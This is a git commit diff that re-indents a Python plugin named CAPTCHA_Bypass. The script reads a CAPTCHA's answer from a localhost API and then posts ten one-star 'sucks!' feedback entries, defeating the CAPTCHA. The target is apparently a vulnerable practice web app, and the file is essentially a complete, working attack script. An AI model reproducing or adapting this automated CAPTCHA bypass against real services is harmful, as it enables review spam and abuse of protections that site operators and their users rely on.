76d656eabda780ebc690db5ff2eb6897c6bdbf9d
River <9203182+RiverChen-cyber@users.noreply.github.com>
2022-11-06 09:52:31 -0800

    indentation

--- plugins/CAPTCHA_Bypass.py
+++ plugins/CAPTCHA_Bypass.py
@@ -1,26 +1,26 @@
 import requests
 import json
 
-class CAPTCHA_Bypass(a.attack_inter):
-for x in range(0,10):
+class CAPTCHA_Bypass():
+	for x in range(0,10):
 
-	# GET captcha id and answer
-	r = requests.get("http://localhost:3000/rest/captcha/")
-	data = r.json()
+		# GET captcha id and answer
+		r = requests.get("http://localhost:3000/rest/captcha/")
+		data = r.json()
 
-	captcha_id = data['captchaId']
-	captcha_answer = data['answer']
+		captcha_id = data['captchaId']
+		captcha_answer = data['answer']
 
-	# POST form 
+		# POST form 
 
-	# Create form parameters
-	# sample parameters {"captchaId":11,"captcha":"17","comment":"asdasd","rating":5}
-	json_obj = {"captchaId":captcha_id,"captcha":captcha_answer,"comment":"sucks!","rating":1}
+		# Create form parameters
+		# sample parameters {"captchaId":11,"captcha":"17","comment":"asdasd","rating":5}
+		json_obj = {"captchaId":captcha_id,"captcha":captcha_answer,"comment":"sucks!","rating":1}
 
-	headers = {
-	'Content-type':'application/json', 
-	'Accept':'application/json' }
-	result = requests.post("http://localhost:3000/api/Feedbacks", data=json.dumps(json_obj), headers=headers)
-	print(result)
-	print(result.status_code)
-	#print(result.json())
+		headers = {
+		'Content-type':'application/json', 
+		'Accept':'application/json' }
+		result = requests.post("http://localhost:3000/api/Feedbacks", data=json.dumps(json_obj), headers=headers)
+		print(result)
+		print(result.status_code)
+		#print(result.json())
